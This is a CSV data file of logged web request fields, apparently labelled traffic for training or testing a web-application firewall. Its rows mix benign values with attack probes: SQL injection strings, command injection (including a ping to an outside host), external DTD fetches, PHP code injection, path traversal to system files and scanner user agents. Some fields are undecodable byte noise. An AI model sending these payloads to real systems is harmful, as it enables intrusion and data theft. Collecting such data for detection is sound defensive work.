,id,meta1,meta2,meta3,vector
18,0239645170e90dc117346bcd1404a2d8,REQUEST_ARGS,action,200.0,verificationcode;vid=register;rand=d04fe1889f14303912945c56b96afb6c
19,f7d6147949bb056f6520d6e952ea1fe9,REQUEST_POST_ARGS,reference to,405.0,http://wcxu6p3r.a.wlrm.tl/b.ent
20,477e5aa5f59cb74afb458c7f78b938ac,REQUEST_ARGS_KEYS,Â½Â¿IÃÃÃ®Ã)Ã®_fGÂÂbÂ ÂqÃBÃ$)nÂ½_Ã§ÂbiÃ¥Â$Ã»Ã2Â ÃºÂ±Ã}#ÂªÂÂYÂ´Ø­`ÂHÂ­Â¶Â³Ã£w,200.0,Â½Â¿IÃÃÃ®Ã)Ã®_fGÂÂbÂ ÂqÃBÃ$)nÂ½_Ã§ÂbiÃ¥Â$Ã»Ã2Â ÃºÂ±Ã}#ÂªÂÂYÂ´Ø­`ÂHÂ­Â¶Â³Ã£w
21,384a3f28bfbcf013c36358dba6a90d18,REQUEST_ARGS,action,304.0,dlattach;topic=1757.0;attach=3098;image
22,569be61485a0205c6da1f44a82d9ad7d,REQUEST_HEADERS,Host,302.0,mZBH1iwe\'; waitfor delay \'0:0:4\' --
23,1b7989be2a8630e90ebef28c0a997db0,REQUEST_ARGS,page,200.0,277|${ls -la;factor 228000}
24,c6aeaa04412ad95fdc80fb94550bef26,REQUEST_URI,,404.0,//tmp/20160925125635indo.php.vob
25,1d81a23c6c325a7fe1f583d35cd6f4f5,REQUEST_URI,,200.0,/software/downl.../ftp.drweb.com/pub/drweb/windows/page1_2.php?view_result=&PAGEN_1=27
26,c57d7717d544ae7864068f37e6128299,REQUEST_ARGS_KEYS,ÂÃ®zÂ¿AÃ²Â¯Â¾iÂ¦Â¥ÃÃ®Â­oÃ²CÂW__;ÃµÃ#Â,200.0,ÂÃ®zÂ¿AÃ²Â¯Â¾iÂ¦Â¥ÃÃ®Â­oÃ²CÂW__;ÃµÃ#Â
27,4bd9646a74097504aae1a5f7d134dacc,REQUEST_ARGS,id,302.0,18924null/{{_orderLink}}/{{_cabinetLink}}/{{_cabinetLink}}/luxtrain/public/pass/{{_orderLink}}/{{_orderLink}}/{{_cabinetLink}}/{{_cabinetLink}}/{{_orderLink}}/{{_cabinetLink}}/{{_orderLink}}/{{_cabinetLink}}/{{_cabinetLink}}
28,6d3785d31114c558f67ea2d54b4dd58b,REQUEST_ARGS,action,302.0,profile;area=forumprofile;u=1598571;save
29,a5bcf1ab4f527f0cc161af40c483c198,REQUEST_HEADERS,REQUEST_HEADERS.If-Modified-Since,200.0,"Wed, 26 Jul 2017 14:09:38 GMT"
30,20b3f3e065663d382f70f5d27a886cbc,REQUEST_ARGS,installation_varValue,301.0,`ping -c 10 yai8fnyw.a.wlrm.tl`
31,d215e7c4250b999733af7e13f89309b4,CLIENT_SESSION_ID,,200.0,wp-admin/load-styles.php.
32,5d19f89c9600eb039728c5d7599d21f3,REQUEST_HEADERS,User-Agent,200.0,sqlmap/1.0-dev-nongit-201512280a89 (http://sqlmap.org)
33,4f68724f124c96655e58f34a29c77fbb,REQUEST_GET_ARGS,REQUEST_GET_ARGS._,404.0,1516638231636
34,34e330a877fd51fdb7f93dbcbaa32fe4,REQUEST_COOKIES,anj,200.0,dTM7k!M4/KT_vw@@Beh$a\'GfHlCO8Glq1WA%dZ\'SVIQ!^j%o41S[q6Q`cDh$2nzr8O-\'rm$H=Iq#2PXB1e2(qdpjmO1tP\'uXwv]30(_j<Â¬z6<asX)1Ep(l7CP3@WcZoHfsQ? KJj6L.UR!kL(hQEM/Rdj_5P /wVWU7VHLZqB:^ADuYsW!GOG[ m1%t4n:K-hO.Ara1ClAyO=6:_<XQ9j<@PQhF@jnLOPDMCfoB\'!ic<vy_kdWVoFj#1X%-kf/PMk>WC[KT1J%8vuOZ8^a5o/JUY6 #wlqX.S)Q7iNpqUXd0cpYx/m4DOf dDM%I`3wh .fv=YC `KW$]YN)JN1C38<l/OGIR(O1ewWbMPj`An??j^:e5F)T3JS9y4HcYS!/D-1.RPhzu8`5M^`WDEokdFxRx)HHLtn%+7@<73gVkfF%K%pv%G5bgFGmN-J%=w^.!o05].2dzctfkQ$f9=-Lq)26ZLXV6J\'Vg%aKNF512ZjaR>wA29sHg8:j]9fW</k5cZlLI46LlN7[/*Wy-RU`L_SFM9L5DYa-C%v2Y^ bH5$CJjkfSrWnzV?3[SfMRSnfU/nJf(@<.4#hjg>rdY2m1>lHG>Vba8tSiG*ECjXQuH[=W@UK4-BmO541oswBP^Ti>EcLJ]n_FGaGg2.SO1B$PRz`O%`b)x!^9]dW-dV`ZmI_Wx6q3-Uwdr`v%*fR7]:C7S65f9(fFeHhnaQ=OjT@b0_a45iMnnfnIdC7^hy37W7p%t VWkS]?7q%7:.%eqx[Su/M3?]D)%1#UA:lbH-!H@Vb##[>Qd_unk-`^BNo(5i/1_!uw*S[]=aRm9Iw62-hjA4!0J<c3BX@JOruY9oOsTzdj%%-DLQ[I!T0ISEZDVXnv0[c)m3K(4vAc@X@QVLPY78j>Msa`1tv4ZhbT6XjJ\'01k1VQDGcs`m.kPu1tA4h>P0U)0mR=0B\'YB7-25- I6?>ZFE4S/VMwn/<%v]N?E]G0uo^IIWSR
35,bfa71d1269eeea4de31b483a97e54247,REQUEST_HEADERS,User-Agent,404.0,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005577)
36,96eb14a72367d5052fca537946b3fed1,REQUEST_GET_ARGS,order,200.0,"999999.9\' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39 and \'0\'=\'0"
37,007fe0a05b95a756165345bc646926a9,REQUEST_HEADERS,User-agent,200.0,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100723 SUSE/3.6.8-0.1.1 Firefox/3.6.8
38,aa8aea65ed566fff8101b1083550c5be,REQUEST_ARGS_KEYS,%25252525252526page%2525252525253D3%252525252526page%25252525253D4%2525252526page%252525253D2%25252526page%2525253D4%252526page%25253D3%2526page%253D3%26page%3D4&page=4,200.0,%25252525252526page%2525252525253D3%252525252526page%25252525253D4%2525252526page%252525253D2%25252526page%2525253D4%252526page%25253D3%2526page%253D3%26page%3D4&page=4
39,04a4e32e50fcfe25ade280dd863e79c2,REQUEST_GET_ARGS,REQUEST_GET_ARGS._,404.0,445949159
40,9be8ad97a3a682c9eb2359a40c8a9dc1,REQUEST_ARGS,,200.0,"
--boundaryemae
Content-Disposition: form-data; name=""data""; filename=""C:\Users\NataliaAkhmedova\AppData\Local\Temp\66\v8_8803_b28a.was""
Content-Type: application/x-zip-compressed


DELETE FROM SC_tagged_objects WHERE tag_id NOT in('13','57') AND object_id='1943'"
41,cb583a5f32f3768b352df5727fcd5edb,REQUEST_XML,REQUEST_XML./request:requestid,200.0,{90A1903B-11E8-4FBE-A1E0-829D5D03372D}
42,2a06eed3fd5d9ccd02ba1e4533b9cfbe,REQUEST_ARGS,gid,200.0,550{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}}
43,ceee18b4960b8bbaffe89f7002b90f1f,REQUEST_COOKIES,REQUEST_COOKIES.AFFICHE_W,302.0,2p604aQuFuHa86
44,e2377770cd03def4c0858609044d9f8c,REQUEST_GET_ARGS,REQUEST_GET_ARGS.UntilKey,200.0,"20180204T230000,00Z"
45,665c1a20f46349960b083094dafb7ec9,REQUEST_HEADERS,User-Agent,200.0,"Mozilla/5.0 (BlackBerry; U; BlackBerry 9360; id) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.219 Mobile Safari/534.11+"
46,153da9631ee9bdf23ee219d3b29bd420,REQUEST_POST_ARGS,Ã³Ã¾xiÃ¿,200.0,"ÂÃ¡Ã¾bÃ¶oÈÂw}ÂRÃ¿ ÂvÃ·Ã²Ã«Ã¿ ÂÂ£Ã¬zÂÃ¼Ã³Â°Ã¿ Â¾Ã®Â¿Ã¸Âª^Ã=ÂÃ¡Ã¾dÃ»'Ã¤V
ZÙF>ÂÂ²-Â¤iW/#G4ÃIÂ°Â±RSnÃIÃ¯ZLXjÃ­ÂRÂhÃ Â\eÂ¸ÂÃX{ÃÃÃ¸ÂÃÃÃ±ÃºcÃ¼kÂ Ã¤Â¸5Â¯;Ã¹Ã¾YPÃh=F8Ã¯ÂjÃ}BÃ?}[ÂÃ¬Ã²ÂÂ»}ÝºÃ·Â­Â³CÃ½Ã\Ã¼ËªqÃÃÃ¦Â}ÃµÃºÃÃ»<?Ã_ÊÃ¬ÃÃ¿ pV|ÃÃ³Ã»ÂÃ¶ÞÃ4Â¢ÂªÂh^BÂÂÂ£tÃ¼ÜÃ`Ã¢Â1Â)sÃÃBX)Ã§Ã°Â¦Db<ÃmÃ¾Â½Â«Â§UÂyE_Â¨Â®iÂ³Â®1"
47,7b8c416397bd863c318d8e80325e3d11,CLIENT_USERAGENT,,301.0,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
48,977ea1b6be89e21db070ee76274fafaf,REQUEST_ARGS_KEYS,%25252525252526page%2525252525253D1%252525252526page%25252525253D2%2525252526page%252525253D4%25252526page%2525253D2%252526page%25253D2%2526page%253D2%26page%3D4&page=1,200.0,%25252525252526page%2525252525253D1%252525252526page%25252525253D2%2525252526page%252525253D4%25252526page%2525253D2%252526page%25253D2%2526page%253D2%26page%3D4&page=1
49,e80d55d2cc7a139c771122ab47e01529,REQUEST_ARGS,r,404.0,#!r4 2016-09-26 09:25:38||cp1251
50,8a488d96347073724b1e92d0febcd550,REQUEST_URI,,404.0,/tmp/dCS0gBs1gM56TmrP.php
51,5ff157715306db1f6600f5ff5fa46390,RESPONSE_HEADERS,RESPONSE_HEADERS.AN-X-Request-Uuid,200.0,bc3f81f9-194d-4fb1-a88a-020099f1ea48
52,d5a7c252775d21e007553c4826b3e021,REQUEST_POST_ARGS,annotation,200.0,"<p>Ð¡Ð²Ð°ÑÐ¾ÑÐ½ÑÐ¹ Ð°Ð¿Ð¿Ð°ÑÐ°Ñ Fahringer FW-200.&nbsp;<span style=""background-color: transparent;"">Ð¡ÐµÑÐ¸Ñ ÑÐ²Ð°ÑÐ¾ÑÐ½ÑÑ Ð°Ð¿Ð¿Ð°ÑÐ°ÑÐ¾Ð² FW-200 Ð¾ÑÐ½Ð°ÑÐµÐ½Ð° PLC ÐºÐ¾Ð½ÑÑÐ¾Ð»ÐµÐ¼ ÑÐ¾ Ð²ÑÑÑÐ¾ÐµÐ½Ð½ÑÐ¼ Ð°Ð²ÑÐ¾Ð¼Ð°ÑÐ¸Ð·Ð¸ÑÐ¾Ð²Ð°Ð½Ð½ÑÐ¼ 2-Ñ ÑÑÑÐ¿ÐµÐ½ÑÐ°ÑÑÐ¼ Ð¾ÑÐ¶Ð¸Ð³Ð¾Ð¼.&nbsp;</span><span style=""background-color: transparent;"">Ð¡Ð²Ð°ÑÐ¾ÑÐ½ÑÐ¹ Ð°Ð¿Ð¿Ð°ÑÐ°Ñ FW-200 MS Ñ ÑÑÑÐ½ÑÐ¼ Ð·Ð°Ð¶Ð¸Ð¼Ð¾Ð¼ Ð¿ÑÐµÐ´Ð½Ð°Ð·Ð½Ð°ÑÐµÐ½ Ð´Ð»Ñ ÑÐ²Ð°ÑÐºÐ¸ &nbsp;ÑÐ³Ð»ÐµÑÐ¾Ð´Ð¸ÑÑÑÑ Ð¿Ð¸Ð» Ð¾Ñ 1/4"" x .020"" Ð´Ð¾ 2"" x .050"" Ð¸ Ð±Ð¸Ð¼ÐµÑÐ°Ð»Ð»Ð¸ÑÐµÑÐºÐ¸Ñ Ð¿Ð¸Ð» Ð¾Ñ 1/4"" x .020"" Ð´Ð¾ 1-1/4"" x .042"".</span></p>"
53,3add9cce4b48f333f6a1c446b51b71b6,REQUEST_POST_ARGS,reference to,301.0,http://ztxcximn.a.wlrm.tl/a.dtd
54,21bb111d9771d518304eb40697d47be2,CLIENT_USERAGENT,,301.0,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; Zoom 3.6.0; Microsoft Outlook 16.0.4732; ms-office; MSOffice 16)
55,dc63b3098c7630c32a2b68cadc85831a,REQUEST_XML,REQUEST_XML./request:requestid,200.0,{6AE3A678-A741-4B02-8167-966FFF6DF8D5}
56,a79306d97dca4413a3150b1e13869e6e,REQUEST_POST_ARGS,a,405.0,http://gmefg8xf.a.wlrm.tl/a.dtd
57,928f258c60613e57401c3e63c98939a8,REQUEST_PATH,,200.0,"/news/495734.php\"" and \""\""x\""\""=\""\""x\"""
58,4ae37c4b56e11d248d4e0fe051dba36e,REQUEST_GET_ARGS,REQUEST_GET_ARGS.rid,200.0,3554044152
59,f7362ad1fb6407ff673363f7f52b0ceb,REQUEST_POST_ARGS,3ÂÂ9VÃQf>Â¦Â·ÂÃ¿,200.0,"Âºz×¨Xß¬Ã«Â²oÃµÂ¨2Ã¼Ã´Ã¿ fÂ¯1ÃÃ¶Â«pÃÃÃµÃ?Ã´!M	Â«ÂÂnÂÂºÂ±Â­Ã´l};ÂZG 1 ctÃwoÃ¶i2ÂÃªß§Ã»ÂºÃ¿ Âe×¦Â²Â¬ÃÑ¿FÃ¼ÃÃ¬EyÂ£ BÃ¦'2Ã´=Âv#Ã«\Â²V:Â£ ÂÂ¤Â¦Ã~ÃtÃÃ¾5Ã2J)(Çµ -!=Â$ÂKU]Â°ÃÃÃ¥<Ã""dÃHÃÃRÂÃ³ÂªEQ@Ã§sÃ§ÃÃ³Â¤f,OÂ¥7Ã¹{qZÂ£"
60,eb3757bdcb39ad065afc2dcc513b7567,REQUEST_PATH,,403.0,"/<a href=\""/news/tags/Ã¡Ã¥Ã§Ã®Ã¯Ã Ã±Ã­Ã®Ã±Ã²Ã¼/\""\"" style=\""\""font-size: 10px; color: \"""
61,e55192f51fb6f40d3f5aa0035eba4b91,REQUEST_ARGS,image,200.0,../imgbasa/83253841727.jpg
62,7b2178daac7e44768c0aa2778634ec98,REQUEST_GET_ARGS,url,302.0,http://www.plantskydd.com/migraine-medicine-sumatriptan-side-effects.pdf
63,04923a0eb44b6a1fb4301d15d620b03a,CLIENT_USERAGENT,,200.0,GuzzleHttp/6.1.0 curl/7.35.0 PHP/5.5.9-1ubuntu4.14
64,946bb04e89b31f943bdc493fc772cf02,REQUEST_ARGS,a,200.0,news{{`ls -la;factor 228000`}}
65,07e5e7cf4917b3c36d3c995f613f554d,REQUEST_ARGS,,200.0,"
--boundaryemae
Content-Disposition: form-data; name=""data""; filename=""C:\Users\NataliaAkhmedova\AppData\Local\Temp\66\v8_8803_bf26.was""
Content-Type: application/x-zip-compressed


DELETE FROM SC_tagged_objects WHERE tag_id NOT in('31') AND object_id='3710'"
66,b87dd39b2110a1c8392b77a2fca60e00,REQUEST_URI,,304.0,/var/files/img1433747341_little
67,a9a2899b15e76679b99ad1ba4f3bf459,REQUEST_HEADERS,User-Agent,404.0,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006838)
68,b2df405fd0ee24b7286a6422cf9d3e50,REQUEST_ARGS,test,302.0,../../../bin/ls -al|
69,02c6b374d04867c8e656558b529a42b9,REQUEST_PATH,REQUEST_PATH,404.0,/music/andromeda.php
70,bf93d10c1030c5e5fd49bcd4de20acb0,REQUEST_ARGS,,200.0,"
--boundaryemae
Content-Disposition: form-data; name=""data""; filename=""C:\Users\NataliaAkhmedova\AppData\Local\Temp\23\v8_B1DB_1f340.was""
Content-Type: application/x-zip-compressed


DELETE FROM SC_tagged_objects WHERE tag_id NOT in('95') AND object_id='3765'"
71,58b607e7e1c8e995ce09330be95f4ff7,REQUEST_ARGS,pic,200.0,../upload/images/gallery/gallery_287.jpg
72,e7f62ce8c00ad681e2b77be8df903a60,REQUEST_ARGS_KEYS,"7~ÂÂ #ÃÞ´ÃÆ¾Â¦_Ä±-ÂÂ#ÂzÃbÂÏ°lÃ´Ã®Ã$ÃµÃ§Â¾,Â³ÂÃh%ÂÃMÃ¡F)Â·Ã¦ÃÃ®wsÃ´Â¥eÃÃ£Â¡ÃwÂ¤ÃkÃªÂwLÂSÂ¸Â°EÃS1ÂÃ»*Ã¾Ã¯ÃµlÂµÃ¦Ã½Ã¼w7PÃGÂonUÂÂÃÃÃ¬ÃÃ²Â¯Â¾hÂ²Ã¬ÂÃ²]ÆÂ½Â½kÃªA5Ã¼KÃiB8p7Â¬Ã(ÃÃ»",200.0,"7~ÂÂ #ÃÞ´ÃÆ¾Â¦_Ä±-ÂÂ#ÂzÃbÂÏ°lÃ´Ã®Ã$ÃµÃ§Â¾,Â³ÂÃh%ÂÃMÃ¡F)Â·Ã¦ÃÃ®wsÃ´Â¥eÃÃ£Â¡ÃwÂ¤ÃkÃªÂwLÂSÂ¸Â°EÃS1ÂÃ»*Ã¾Ã¯ÃµlÂµÃ¦Ã½Ã¼w7PÃGÂonUÂÂÃÃÃ¬ÃÃ²Â¯Â¾hÂ²Ã¬ÂÃ²]ÆÂ½Â½kÃªA5Ã¼KÃiB8p7Â¬Ã(ÃÃ»"
73,a8acb9cb170a263750a4efe1c0e0e5cb,REQUEST_ARGS,do,200.0,"register""{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}}"""
74,1e23ec1f52d7e948934c52eeae3d79fa,REQUEST_COOKIES,anj,200.0,dTM7k!M4/C@Io<V@BfW4bF0TBnztBLRkf@#B[rC#F7e8_ZP-$tXxV*t`4EK5?ZJKi9Jk6^(>z2[*nAu?-oCCCe$*DgUvE*h8yvrsRGr`3n\'8OUO0Y]7W]H(og@HLdu`@Z6cb63sim:R(e5YAM(r]?sew<%2vuP9nqW>I(M![2?@fr6XmlPzKcHv^RTJ9_7HcPZjw]pHECg`AMZPyORW8%oc^S)QI>DLyB*4#XK@V%hqe3Eo.A(8cb(hJe`v9YPyj\'y.vW.mkGWgd@`a3y!=XA0e<fNCi/.Y/3-o!4bl$0wuP.dh5ZK(C!0=$2S_h@[yT)\'y:c_VXk]vZiwMAEe3nucj81rL5JMXlM]\'h@t/5G JnEHSm(XHw\'uR.iLrImh.>n0R<^]IIIe_#dx!n2IpNqLR-gAx/t:Cb*/w!]z6jab^G\'`um`Mn__[%#= AC%Go*jWr/t`BEh5!Q?oqwU7zxiCv*$Z/Kcg@3L#WaRnIIQlWzilhkoOo9<KeBN?F`I19bG 4lOVdjKp#BlwFl=p)hA1 F^)@GU:aBv<F5hEOUrolidhC$1Pg_Sfhzz(-AIAOMqM$8$g:rIp/)wo[x?d88-LwJZ*Y88-rC5Xd1RMs`v!TkbKJ$vibnyD $>[1UH@-Xou7ra2Zfrw3s]lBT>AFVs9:DqpYszcR)V]]jht)JobTc`2G#Ric5:<A6fEWhr=mNkk?2U-a2OLIJ!rz7(RL=m)7<MBQW1m)iYpIv`md$J7j*!QRni1\'un?YH@/6\'f_<ROk%2kYTtSLcowi)!9>m67.c6S`bc/XWekt)(r]V._LIgnn9QC[$g-TF]QlJ$A6iD9`:5ND3`(-GBA-.P4xE15FZUIF -UxQwBRGFwW>Mo]6sO`6ukuYh4<udxqa**1Ut]nuwGTw=O[gjbPL2QQ=*t30hgM88gd(k:%W#Bhm^DM92ujSVaNdjcQ\'17ad.=K0oA/Ce=.K\'h[o>JxxkR$o!_8cPZMl9v1
75,f66df4ac27504cf8fcbd0fe6d43aef41,CLIENT_USERAGENT,,200.0,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
76,e69ac06e96fb58540eae9adf70a4046a,REQUEST_URI\';\'REQUEST_ARGS,StartingDirectory,404.0,/metalwh/productionnu2/report.php?StartingDirectory=../../../../../../../../../../../boot.ini%00\';\'../../../../../../../../../../../boot.ini\\x0
77,e54dbb37ed977bdf03ff9716516a5da3,REQUEST_METHOD\';\'REQUEST_CONTE,,200.0,POST\';\'multipart/form-data; boundary=----WebKitFormBoundaryBzsTAIuYzaQlBrTs\';\'
78,d2d64fb5b26f9575ceb43588e76d3c9a,REQUEST_ARGS,src,302.0,../images/catalog/goods/15/1.jpg
